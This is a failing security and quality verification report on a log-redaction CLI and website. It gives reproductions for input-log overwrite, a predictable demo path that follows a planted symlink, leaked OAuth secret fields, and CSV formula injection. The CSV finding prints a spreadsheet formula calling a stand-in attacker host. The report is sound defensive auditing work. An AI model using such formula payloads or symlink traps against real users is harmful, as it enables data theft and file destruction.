# Independent verification 7 — FAIL

**Work order:** `log-incident-bundle-verify-7`
**Candidate:** `f8bf6f9142e58aee74b0b7038bf11009c4e2acf7`
**Live URL:** https://log-incident-bundle.sociobot.in
**Verified:** 2026-08-29 from a clean candidate checkout

## Verdict

**FAIL.** The automated suite, live deployment, first-read gate, privacy checks,
and performance checks pass. Independent CLI testing found three high-severity
local safety defects in the core workflow: a user can overwrite the source log,
the predictable demo path follows a hostile symlink, and the default preset
leaves common OAuth secret fields in the artifact. CSV export also emits
formula-capable cells, and two manual accessibility requirements are missed.

## First-read gate

**PASS.** A cold live load at desktop and 390 px answers all three questions on
the first screen:

- What: “Create a redacted log excerpt.”
- For whom: “For teams who need answers without granting raw production-log
  access.”
- First action: “Try it with sample data,” followed by “See a redacted incident
  review first.”

The action opens the populated six-record demo in one click. The page then
shows “Demo — sample data, nothing is saved,” plus **Reset demo** and **Start
for real**.

## Release-blocking findings

### High — `--output` can silently destroy an input log

The CLI does not reject an output path that is also an input path. It first
reads the source and then truncates it with the generated HTML, exits 0, and
reports success. This can destroy the raw incident evidence the user is trying
to preserve.

Reproduction with the packaged, clean-consumer binary:

```sh
cp examples/payment-api.log /tmp/lib-overwrite-input.log
log-incident-bundle /tmp/lib-overwrite-input.log \
  --output /tmp/lib-overwrite-input.log --json
```

Observed:

```text
exit 0
before SHA-256 2c25ff4f5695ef4c133c100f266f1375a689b24580b78970c03b18138e235b4e
after  SHA-256 0d9e422cc1f4e0e36a05bf41f8d6ef0c8067ef8cfc8bd31a041281d7589a0c1c
{"output":"/tmp/lib-overwrite-input.log","records":7,"sources":1}
```

The first line of the former log is then `<!doctype html>`. There is no prompt,
`--force` requirement, backup, or recovery path.

### High — `--demo` uses a predictable shared path and follows symlinks

Every demo writes `/tmp/log-incident-bundle-demo.html`, rather than a unique
temporary directory as required by the demo-sandbox contract. It overwrites an
existing file. More seriously, `fs::write` follows a symlink already placed at
that predictable path.

A safe reproduction linked the fixed demo path to a disposable victim file.
`log-incident-bundle --demo --json` exited 0 and changed the victim hash:

```text
output=/tmp/log-incident-bundle-demo.html
symlink target=/tmp/lib-demo-link-qucx9c/victim.html
before=b1a19bc7c1f579e63f797b8496631063515096c03f37462c404541d4661bc7a5
after =1ead0ddba95c41bb07fb92b876cd70a84d910f306c6d3c99f98747945c08bb0e
```

On a multi-user machine, another local user can pre-place that link and cause
the demo to overwrite any file writable by the person running the CLI.

### High — the advertised default preset leaks common OAuth secret fields

The README says the default rules replace “common secret fields including
`token`,” and the brief requires a conservative preset. The packaged CLI left
all of these raw values in both the HTML file and rendered table:

```text
client_secret=clientSecretValue
refresh_token=refreshTokenValue
id_token=idTokenValue
private_key=privateKeyValue
```

It also left `authorization="Basic basicCredentialValue"`, `session=...`, and
`cookie=...`. In the same record, exact `password` and `token` fields were
redacted. The warning that pattern redaction is not a guarantee is appropriate,
but does not make predictable canonical secret-field omissions conservative.

### Medium — CSV export preserves spreadsheet formulas

An untrusted record beginning with a spreadsheet formula is quoted but not
neutralized. Downloading CSV from the generated artifact produced:

```csv
timestamp,source,line,text
"","stdin","1","=HYPERLINK(""https://attacker.example/collect"",""Open record"")"
```

Spreadsheet applications can interpret a quoted cell beginning with `=`, `+`,
`-`, or `@` as a formula. This extends attacker-controlled log content outside
the artifact's otherwise effective CSP.

### Medium — manual focus and touch-target checks miss the stated baseline

- Keyboard focus on **Reset demo** uses `#29654c` against the banner's
  `#b7432e`, a measured **1.26:1** contrast ratio. The attached accessibility
  contract requires at least 3:1. Playwright confirmed a 3 px solid outline
  with 4 px offset, so the adjacent color is the red banner.
- At 390 px, **Open the working sample review →** measures **246.9 × 19 px**,
  below the required 44 px target height. The skip link is also 42.3 px high
  when exposed.

These are manual gaps not reported by axe or Lighthouse.

## Claims verification

`.factory/claims.json` exists and lists 13 claims. In the pristine checkout,
the exact commands were attempted before dependency installation and could not
load `@playwright/test`, as expected with no `node_modules`. After the required
clean install (`npm ci`: 22 packages, 0 vulnerabilities), every exact command
passed through its declared demo fixture:

| Claim ID | Exact command result |
| --- | --- |
| `portable-html` | PASS |
| `default-redaction` | PASS |
| `cli-inputs` | PASS |
| `bounds-correlation` | PASS |
| `custom-redaction` | PASS |
| `local-processing` | PASS |
| `site-runtime` | PASS |
| `site-log-privacy` | PASS |
| `csv-download` | PASS |
| `demo-cli` | PASS |
| `finite-review` | PASS |
| `mit-license` | PASS |
| `delivery-policy` | PASS |

Each command also reran the five Rust unit tests. The new redaction, path
collision, symlink, and CSV cases are absent from the claims suite, so passing
the listed fixtures does not cover the defects above. No separate material
marketing claim without a corresponding claims entry was found.

## Clean build and package evidence

| Check | Result |
| --- | --- |
| `npm ci` | PASS — 22 packages; 0 vulnerabilities |
| `npm test` | PASS — 5 Rust tests; 29 Playwright tests |
| `npm run typecheck` | PASS |
| `npm run lint` | PASS |
| `npm run build` | PASS — creates `dist/site/` |
| `cargo fmt --check` | PASS |
| `cargo clippy --all-targets --all-features -- -D warnings` | PASS |
| `cargo build --release` | PASS |
| `cargo package --allow-dirty` | PASS |

The packaged crate was installed into a fresh temporary Cargo root with
`cargo install --path target/package/log-incident-bundle-0.1.1 --root ...
--locked`. The resulting single binary passed `--version`, useful `--help`,
`--demo --json`, file input, stdin input, and JSON completion output.

Representative end-to-end checks also passed:

- A two-second sample window plus `--correlate trace_id` produced six linked
  records and excluded the unrelated health check.
- Equal `--from` and `--to` bounds included the record at that exact instant.
- Search reduced six rendered rows to one; CSV contained one header and six
  records; the rendered provenance SHA-256 matched the source bytes.
- Email, bearer, exact password/token fields, and AKIA/ASIA IDs were absent
  from the tested artifact.
- Script-boundary payloads in records, title, and question stayed inert; the
  artifact issued no network requests and logged no browser errors.
- Invalid RFC 3339 bounds, inverted bounds, missing input, and missing rules
  exited nonzero. Invalid bound cases did not create an output.
- Empty stdin produced a valid zero-record review with a concrete widening
  instruction.

## Live deployment, privacy, and browser evidence

- `./verify-url.sh` passed all five routes at 1280 px and 390 px locally and
  live. Live unknown routes return a real HTTP 404.
- `PLAYWRIGHT_BASE_URL=https://log-incident-bundle.sociobot.in npx playwright
  test` passed all 29 tests.
- Live `index.html`, hashed JS, hashed CSS, both WebP assets, `404.html`,
  `robots.txt`, and `sitemap.xml` match the candidate build byte-for-byte.
- Fresh Playwright logging across home, demo, privacy, and terms recorded only
  same-origin GET requests. Local storage, session storage, and IndexedDB were
  empty after the flow. There were no console or page errors.
- Browser response headers include HSTS, `nosniff`, `DENY` framing,
  strict-origin referrer policy, and the self-only CSP with
  `frame-ancestors 'none'`. HTML revalidates after 30 seconds. Hashed JS/CSS
  and WebP assets use `max-age=31536000, immutable`.
- The internal link crawl returned 200 for every destination. The 404 page
  includes its route back and legal links.
- The site has no server-side product endpoint, account, sign-in, paid unlock,
  AI call, or service worker. API allowance/429, Entra authority, billing,
  backend concurrency/persistence, and PWA update/offline tests are therefore
  not applicable.

## Accessibility and performance evidence

- axe found zero serious/critical findings on every verifier route at desktop
  and 390 px, and on the generated artifact.
- Keyboard-only navigation reaches the skip link, demo, search, CSV, reset,
  legal routes, and route headings. Route changes move focus and announce the
  new title. No trap was found.
- Mobile pages and the generated artifact have no horizontal page overflow;
  the principal form controls are 44 px high.
- Reduced-motion mode reports no animation on the hero figure.
- Local build sizes: **9.72 KB JS** (3.97 KB gzip), **7.60 KB CSS** (2.48 KB
  gzip), and **237,060 B** hero WebP.
- Lighthouse 13 mobile, live home: Performance **98**, Accessibility **100**,
  Best Practices **100**, SEO **100**; FCP **0.8 s**, LCP **2.0 s**, CLS **0**,
  TBT **140 ms**, total transfer **239 KiB**.
- Lighthouse 13 mobile, live demo: Performance **100**, Accessibility **100**,
  Best Practices **100**, SEO **100**; FCP/LCP **0.9 s**, CLS **0**, TBT
  **50 ms**.

## Required remediation

1. Reject output paths that resolve to any input path. Avoid silent overwrite
   of existing output unless an explicit, documented `--force` policy is used.
2. Create CLI demos in a securely created unique temporary directory and do
   not follow a pre-existing predictable symlink.
3. Expand and test the conservative preset for canonical OAuth and other
   secret fields, including common prefix/suffix forms.
4. Neutralize formula-leading CSV cells before download and add an adversarial
   claim regression.
5. Give every touch target 44 px and choose focus colors that maintain at least
   3:1 contrast against each adjacent background.
